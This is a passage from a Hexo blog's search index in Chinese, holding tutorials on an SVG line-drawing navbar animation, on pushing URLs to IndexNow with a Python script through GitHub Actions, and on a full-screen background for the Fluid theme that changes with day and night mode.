xmlns="http://www.w3.org/2000/svg"&gt;</span></span><br><span class="line"><span class="string">...略...</span></span><br><span class="line"><span class="string">&lt;/svg&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> paths = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">'.container .navbar-brand .svg path'</span>)</span><br><span class="line"><span class="comment">// console.log(paths.getTotalLength());</span></span><br><span class="line"><span class="keyword">const</span> len = paths.<span class="title function_">getTotalLength</span>()</span><br><span class="line">paths.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">'--l'</span>, len)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="为什么这么写"><a class="markdownIt-Anchor" href="#为什么这么写"></a> 为什么这么写？</h3><p>这里主要是利用浏览器开发者工具查看你的网站元素结构，找到导航栏的标题位置：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020528928.png" alt="image-20241102052841792"></p><p>可以看到类名为 <code>navbar-brand</code> 的就是导航栏的标题区域，我们就是要将 svg 放在这里。</p><p>上图我已经做出修改，如果没有进行修改的话，你这里的 <code>&lt;svg&gt;</code> 标签应该是依照你的<code>_config.fluid.yml</code> 中设置的导航栏标题也就是 <code>&lt;strong&gt;</code> 标签。</p><p>修改的语句也很简单，先找到父亲 <code>navbarBrand</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> navbarBrand = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">'.container a'</span>);</span><br></pre></td></tr></tbody></table></figure><p>接着使用<code>.innerHTML</code> 设置为 svg 即可：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">navbarBrand.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;svg class="svg" viewBox="0 0 682.2 98.507" xmlns="http://www.w3.org/2000/svg"&gt;</span></span><br><span class="line"><span class="string">...略...</span></span><br><span class="line"><span class="string">&lt;/svg&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br></pre></td></tr></tbody></table></figure><p>这样只是先将 svg 放在这里了，还需要明白怎么写动画。</p><blockquote><p>可以参考文章：<a href="https://juejin.cn/post/6955857586922979364">https://juejin.cn/post/6955857586922979364</a></p><p>或者视频：<a href="https://www.bilibili.com/video/BV1Qi4y1Y7Sp/">https://www.bilibili.com/video/BV1Qi4y1Y7Sp/</a></p><p>真不是摆烂，大佬讲的是真香</p></blockquote><p>所以现在还需要知道每条 path 的长度，可以使用<code>当前选择的元素.getTotalLength()</code> 得到：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> paths = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">'.container .navbar-brand .svg path'</span>) <span class="comment">// 进一步选择到path</span></span><br><span class="line"><span class="keyword">const</span> len = paths.<span class="title function_">getTotalLength</span>()</span><br><span class="line">paths.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">'--l'</span>, len)</span><br></pre></td></tr></tbody></table></figure><p>如果你在之前生成 svg 的时候，生成了多条 path，这里你应该使用的是：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> paths = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">'.container .navbar-brand .svg path'</span>)</span><br><span class="line">paths.<span class="title function_">forEach</span>(<span class="function"><span class="params">path</span> =&gt;</span> {</span><br><span class="line">  <span class="keyword">const</span> len = path.<span class="title function_">getTotalLength</span>()</span><br><span class="line">  path.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">'--l'</span>, len)</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p>给每条 path 设置上行内样式为变量 <code>--l</code> 方便后面 css 的编写。</p><h2 id="编写css"><a class="markdownIt-Anchor" href="#编写css"></a> 编写 CSS</h2><p>在 <code>source\css</code> 目录下创建 <code>sign.css</code>：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.svg</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200pt</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">30pt</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.svg</span> <span class="selector-tag">path</span> {</span><br><span class="line">  <span class="attribute">stroke</span>: white;</span><br><span class="line">  <span class="attribute">stroke-width</span>: <span class="number">3pt</span>;</span><br><span class="line">  <span class="attribute">stroke-linecap</span>: round;</span><br><span class="line">  <span class="attribute">stroke-dasharray</span>: <span class="built_in">var</span>(--l);</span><br><span class="line">  <span class="attribute">stroke-dashoffset</span>: <span class="built_in">var</span>(--l);</span><br><span class="line">  <span class="attribute">fill</span>: none;</span><br><span class="line">  <span class="attribute">fill-rule</span>: nonzero;</span><br><span class="line">  <span class="attribute">animation</span>: stroke <span class="number">25s</span> forwards;</span><br><span class="line">  -webkit-<span class="attribute">animation</span>: stroke <span class="number">25s</span> forwards;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> stroke {</span><br><span class="line">  <span class="selector-tag">to</span> {</span><br><span class="line">    <span class="attribute">stroke-dashoffset</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* fill: white; */</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>通过样式变量使得 <code>stroke-dasharray</code> 和 <code>stroke-dashoffset</code> 属性能轻易获取到 path 的长度，也就方便了 <code>@keyframes stroke</code> 的编写。</p><h2 id="另一个方法"><a class="markdownIt-Anchor" href="#另一个方法"></a> 另一个方法</h2><p>其实有个库可以实现这种效果：Vivus.js</p><p>demo：<a href="https://maxwellito.github.io/vivus/">https://maxwellito.github.io/vivus/</a></p><p>GIthub 地址：<a href="https://github.com/maxwellito/vivus">https://github.com/maxwellito/vivus</a></p><p>使用方法也很简单，只要给 svg 标签加上 id 即可：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg id=<span class="string">"my-svg"</span>&gt;</span><br><span class="line">  &lt;path...&gt;</span><br><span class="line">  &lt;path...&gt;</span><br><span class="line">  &lt;path...&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">new</span> <span class="title class_">Vivus</span>(<span class="string">'my-svg'</span>, {<span class="attr">duration</span>: <span class="number">200</span>}, myCallback);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美化 </tag>
            
            <tag> CSS </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 线条动画 </tag>
            
            <tag> 路径动画 </tag>
            
            <tag> svg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 博客配置 GitHub Actions 推送 indexnow</title>
      <link href="/posts/7648.html"/>
      <url>/posts/7648.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="什么是-indexnow"><a class="markdownIt-Anchor" href="#什么是-indexnow"></a> 什么是 IndexNow？</h2><p>IndexNow 是一种开源协议，可以让网站所有者在网站内容出现变化（添加、更新或删除）后通知搜索引擎，让搜索引擎立即索引这些页面和内容。这使搜索引擎能够在其搜索结果中快速反映这种变化，从而提高整体抓取效率。</p><h2 id="api-key"><a class="markdownIt-Anchor" href="#api-key"></a> API Key</h2><p>找到 <a href="https://www.bing.com/indexnow/getstarted">Indexnow 官网</a>生成 API Key（每点击一次 Generate 都会生成一个新的 Key）：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410272123991.png" alt="image-20241027212339859"></p><h2 id="验证网站所有权"><a class="markdownIt-Anchor" href="#验证网站所有权"></a> 验证网站所有权</h2><p>你需要点击上图中 API Key 右边的下载按钮，将该 <code>5617c6a058f84405b90e2a0c6e99519a.txt</code> 文件保存好。</p><p>然后把它放到你的网站根目录下，让它可以通过网址链接 <code>https://www.example.com/5617c6a058f84405b90e2a0c6e99519a.txt</code> 的形式访问，并得到明文 API Key：<code>5617c6a058f84405b90e2a0c6e99519a</code></p><p>比如，将 <code>5617c6a058f84405b90e2a0c6e99519a.txt</code> 放在 <code>source</code> 目录下，并在<code>_config.yml</code> 中配置 <code>skip_render</code> 如下：</p><figure class="highlight yml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">skip_render:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"*.py"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"*.txt"</span></span><br></pre></td></tr></tbody></table></figure><p>这样可以确保 Hexo 不会尝试渲染这些文件，而只是将它们直接复制到 <code>public</code> 目录。</p><p>这样就做好了第一和第二步。</p><h2 id="github-actions-配置"><a class="markdownIt-Anchor" href="#github-actions-配置"></a> GitHub Actions 配置</h2><p>GitHub 的 Actions 允许你运行一些小文件，我们可以采用 Python 脚本的方式来提交 URLs</p><h3 id="编写提交-urls-的-python-脚本"><a class="markdownIt-Anchor" href="#编写提交-urls-的-python-脚本"></a> 编写提交 URLs 的 Python 脚本</h3><p>我的 Python 文件如下（<code>index_now.py</code>）：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"userName.github.io"</span>  <span class="comment"># 替换为你的实际域名</span></span><br><span class="line">KEY = <span class="string">"5617c6a058f84405b90e2a0c6e99519a"</span>  <span class="comment"># 替换为你的 API Key</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_latest_posts</span>(<span class="params">sitemap_path, n=<span class="number">10</span></span>):</span><br><span class="line">    <span class="comment"># 解析 XML sitemap</span></span><br><span class="line">    tree = ET.parse(sitemap_path)</span><br><span class="line">    root = tree.getroot()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用命名空间</span></span><br><span class="line">    namespaces = {<span class="string">'s'</span>: <span class="string">'http://www.sitemaps.org/schemas/sitemap/0.9'</span>}</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取所有 URL</span></span><br><span class="line">    urls = [(url.find(<span class="string">'s:loc'</span>, namespaces).text, url.find(<span class="string">'s:lastmod'</span>, namespaces).text)</span><br><span class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> root.findall(<span class="string">'s:url'</span>, namespaces)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据最后修改时间排序</span></span><br><span class="line">    urls.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回最近的 n 个 URL</span></span><br><span class="line">    <span class="keyword">return</span> [url[<span class="number">0</span>] <span class="keyword">for</span> url <span class="keyword">in</span> urls[:n]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping_bing</span>(<span class="params">url_list</span>):</span><br><span class="line">    <span class="comment"># url = 'https://www.bing.com/indexnow'</span></span><br><span class="line">    url = <span class="string">'https://api.indexnow.org/IndexNow'</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/json; charset=utf-8'</span>,</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 准备数据</span></span><br><span class="line">    data = {</span><br><span class="line">        <span class="string">"host"</span>: HOST,</span><br><span class="line">        <span class="string">"key"</span>: KEY,</span><br><span class="line">        <span class="string">"keyLocation"</span>: <span class="string">f"https://<span class="subst">{HOST}</span>/<span class="subst">{KEY}</span>.txt"</span>,</span><br><span class="line">        <span class="string">"urlList"</span>: url_list</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送 POST 请求</span></span><br><span class="line">    response = requests.post(url, headers=headers, json=data)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sitemap_path = <span class="string">"sitemap.xml"</span>  <span class="comment"># 替换为你的 sitemap 文件路径</span></span><br><span class="line">    url_list = get_latest_posts(sitemap_path, <span class="number">10</span>)  <span class="comment"># 获取最近 10 篇文章的 URL</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"最近更新的文章 URL 列表："</span>)</span><br><span class="line">    <span class="built_in">print</span>(url_list)  <span class="comment"># 打印获取的 URL 列表</span></span><br><span class="line"></span><br><span class="line">    response = ping_bing(url_list)  <span class="comment"># 向 IndexNow 发送请求</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"响应状态码："</span>, response.status_code)  <span class="comment"># 打印响应状态</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"响应内容："</span>, response.text)  <span class="comment"># 打印响应内容</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>脚本值得注意的点在于：</p><ol><li><code>HOST = "userName.github.io"</code></li><li><code>KEY = "5617c6a058f84405b90e2a0c6e99519a"</code></li><li><code>sitemap_path = "sitemap.xml"</code></li></ol><p>前面两个主要是配置成你自己的就行。</p><p>主要是第三个 sitemap 路径问题，我建议安装 <code>hexo-generator-sitemap</code> 插件，该插件在每次 <code>hexo g</code> 生成文件时<strong>重新生成</strong>新的 <code>sitemap.xml</code> 文件并放置在 <code>public</code> 目录下，这会使得它被推送时放置在仓库根目录下，符合我脚本的要求。</p><p>脚本编写好后，同样需要将其推送到仓库，我的是根目录。我将脚本同样放在 <code>source</code> 目录下，这样它会和 <code>key.txt</code> 一同被推送至仓库根目录。</p><h3 id="本地创建-workflows"><a class="markdownIt-Anchor" href="#本地创建-workflows"></a> 本地创建 workflows</h3><h4 id="hexo-配置"><a class="markdownIt-Anchor" href="#hexo-配置"></a> Hexo 配置</h4><p>创建 GitHub workflow 一般是<code>.github/workflows/xxx.yml</code></p><p>但是 Hexo 默认忽略以点（<code>.example</code>）开头的文件和文件夹，所以我的做法是修改<code>_config.yml</code> 中的 <code>include</code> 项，将其添加进去：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">include:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">".github/**/**"</span></span><br></pre></td></tr></tbody></table></figure><p>此时还需要修改下 <strong>skip_render</strong> 这个配置，否则 hexo 会自动把 yaml 文件给转成 json 格式的，到时候 GitHub 是不识别的（<code>_config.yml</code>）：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">skip_render:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">".github/**/**"</span></span><br></pre></td></tr></tbody></table></figure><p>最后需要配置下 hexo 的 <strong>deploy</strong> 配置，不要忽略隐藏文件。否则在最后部署到 GitHub 时，隐藏文件会被忽略掉（<code>_config.yml</code>）：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:userName/userName.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br><span class="line">  <span class="attr">ignore_hidden:</span> <span class="literal">false</span> <span class="comment"># 取消忽略隐藏文件</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>.github</code> 隐藏目录相关配置项参考链接为：<a href="https://knktc.com/2021/06/26/hexo-use-github-actions-to-submit-sitemap/">Hexo 博客使用 GitHub Actions 来自动提交 Sitemap</a></p></blockquote><p>这样，Hexo 会将 <code>source/.github</code> 文件夹中的内容也复制到 <code>public</code> 目录中，一旦执行 <code>hexo d</code> 命令便会部署到 GitHub。</p><p><strong>不过你得确保你的 <code>.github</code> 目录直接放在 <code>source</code> 目录下</strong>，即结构如下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">your-hexo-site/</span><br><span class="line">├── <span class="built_in">source</span>/</span><br><span class="line">│   ├── .github/</span><br><span class="line">│   │   └── workflows/</span><br><span class="line">│   │       └── your-action.yml</span><br></pre></td></tr></tbody></table></figure><p>这样一来，当你推送代码至仓库时，GitHub 会自动触发 Actions 运行你的 <code>your-action.yml</code> 文件，所以需要在这个 <code>yml</code> 文件中调用我们写的 Python 脚本。</p><h4 id="编写-action-触发文件"><a class="markdownIt-Anchor" href="#编写-action-触发文件"></a> 编写 action 触发文件</h4><p>我的 <code>indexnow.yml</code> 文件（名字可以随意，但请具有语义性）如下：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Submit</span> <span class="string">IndexNow</span> <span class="string">Request</span> <span class="string">To</span> <span class="string">Bing</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span> [<span class="string">"master"</span>] <span class="comment"># 根据需要替换为你的主分支</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span> <span class="comment"># 允许手动触发工作流</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">indexnow:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">IndexNow</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">repository</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v4</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Set</span> <span class="string">up</span> <span class="string">Python</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-python@v5</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">python-version:</span> <span class="string">"3.11"</span> <span class="comment"># 可以根据需要调整 Python 版本</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">dependencies</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          python -m pip install --upgrade pip</span></span><br><span class="line"><span class="string">          pip install requests  # 安装 requests 库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Run</span> <span class="string">IndexNow</span> <span class="string">script</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">          <span class="string">python</span> <span class="string">index_now.py</span>  <span class="comment"># 替换为你的 Python 脚本文件名</span></span><br></pre></td></tr></tbody></table></figure><p>该文件值得注意的点在于：</p><ol><li><code>branches: ["master"]</code></li><li><code>python index_now.py</code></li></ol><p>注意修改成你的配置项就行。</p><p>至此准备工作已经完毕，你只需要<strong>推送新代码到仓库</strong>就会自动触发 actions 发请求给必应的 indexnow，最终你可以在<a href="https://www.bing.com/webmasters/indexnow">必应网站管理员工具</a>查看效果。</p><ul><li>注：实际上你也可以单独在本地运行该 python 文件，效果是一致的。</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> GitHubActions </tag>
            
            <tag> indexnow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo fluid 全屏背景图随日夜模式切换以及正文底页毛玻璃效果</title>
      <link href="/posts/60191.html"/>
      <url>/posts/60191.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="实现背景图全屏效果"><a class="markdownIt-Anchor" href="#实现背景图全屏效果"></a> 实现背景图全屏效果</h2><blockquote><p>设置背景图为全屏效果，可以使用 fluid 提供的<a href="https://fluid-dev.github.io/hexo-fluid-docs/advance/#fluid-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81">注入代码功能</a>，可以将代码无侵入式加入到主题里。</p></blockquote><p>在根目录下新建一个 <code>scripts</code> 目录，在目录内新建：<code>injector.js</code></p><p>建好之后，博客的根目录大致如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">├─📁 .github/</span><br><span class="line">├─📁 scaffolds/</span><br><span class="line">├─📁 scripts/</span><br><span class="line">├─📁 source/</span><br><span class="line">├─📁 test/</span><br><span class="line">├─📁 themes/</span><br><span class="line">├─📄 _config.fluid.yml</span><br><span class="line">├─📄 _config.landscape.yml</span><br><span class="line">├─📄 _config.yml</span><br><span class="line">├─📄 .gitignore</span><br><span class="line">├─📄 package-lock.json</span><br><span class="line">├─📄 package.json</span><br><span class="line">├─📄 template.md</span><br><span class="line">└─📄 yarn.lock</span><br></pre></td></tr></tbody></table></figure><div class="note warning flat"><p>⚠️注意：<br>该文件不需要在<code>_config.fluid.yml</code> 中进行引用，<strong>hexo 自动调用执行里面的 js 文件</strong></p></div><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> { <span class="attr">root</span>: siteRoot = <span class="string">"/"</span> } = hexo.<span class="property">config</span>;</span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">injector</span>.<span class="title function_">register</span>(<span class="string">"body_begin"</span>, <span class="string">`&lt;div id="web_bg"&gt;&lt;/div&gt;`</span>);</span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">injector</span>.<span class="title function_">register</span>(<span class="string">"body_end"</span>,<span class="string">`&lt;script src="<span class="subst">${siteRoot}</span>js/backgroundize.js"&gt;&lt;/script&gt;`</span>);</span><br></pre></td></tr></tbody></table></figure><p>文件名其实可以随意，但接下来的 js 文件名请与 <code>src="${siteRoot}js/backgroundize.js"</code> 中保持一致。</p><p>如果你<strong>不需要</strong>背景图随日夜主题切换而切换的话，那么你只需要新建 <code>backgroundize.js</code> 并写入以下代码即可：(<code>source\js\backgroundize.js</code>)</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span></span><br><span class="line">  .<span class="title function_">querySelector</span>(<span class="string">'#web_bg'</span>)</span><br><span class="line">  .<span class="title function_">setAttribute</span>(<span class="string">'style'</span>, <span class="string">`background-image: <span class="subst">${<span class="variable language_">document</span>.querySelector(<span class="string">'.banner'</span>).style.background.split(<span class="string">' '</span>)[<span class="number">0</span>]}</span>;position: fixed;width: 100%;height: 100%;z-index: -1;background-size: cover;`</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span></span><br><span class="line">  .<span class="title function_">querySelector</span>(<span class="string">"#banner"</span>)</span><br><span class="line">  .<span class="title function_">setAttribute</span>(<span class="string">'style'</span>, <span class="string">'background-image: url()'</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span></span><br><span class="line">  .<span class="title function_">querySelector</span>(<span class="string">"#banner .mask"</span>)</span><br><span class="line">  .<span class="title function_">setAttribute</span>(<span class="string">'style'</span>, <span class="string">'background-color:rgba(0,0,0,0)'</span>)</span><br></pre></td></tr></tbody></table></figure><p>第一段代码的功能是：找到根节点，在页面的 <code>body</code> 开始部分注入一个 <code>div</code> 元素，其 <code>id</code> 为 <code>web_bg</code>，作为背景图像的容器，然后在页面的 <code>body</code> 结束部分注入 js 文件（<code>backgroundize.js</code>）进行引用，确保脚本在页面加载完成后执行。</p><p>第二段代码的功能是：提取现有<code>.banner</code> 元素的图像 URL，将提取到的图像 URL 应用到 <code>web_bg</code> 元素上，同时设置背景样式为 <code>fixed</code> 固定定位、覆盖整个页面、<code>z-index: -1</code> 并置于其他元素之下。</p><p>至此，背景图就全屏且固定了。</p><h2 id="实现背景图随日夜主题切换效果"><a class="markdownIt-Anchor" href="#实现背景图随日夜主题切换效果"></a> 实现背景图随日夜主题切换效果</h2><p>看到这也就说明你需要标题所述功能。那么请将<code>_config.fluid.yml</code> 中涉及到 <code>banner_img</code> 的部分全部配置为空，因为我们要手动设置背景图。</p><p>例如首页 banner 和文章页 banner（可以通过搜索 <code>banner_img</code> 提高效率）：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505160920360.png" alt="image-20250516092011283"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505160920829.png" alt="image-20250516092031772"></p><p>在 <code>source/js</code> 目录中新建或修改 <code>backgroundize.js</code> 文件，我的代码文件如下：<code>backgroundize.js</code></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 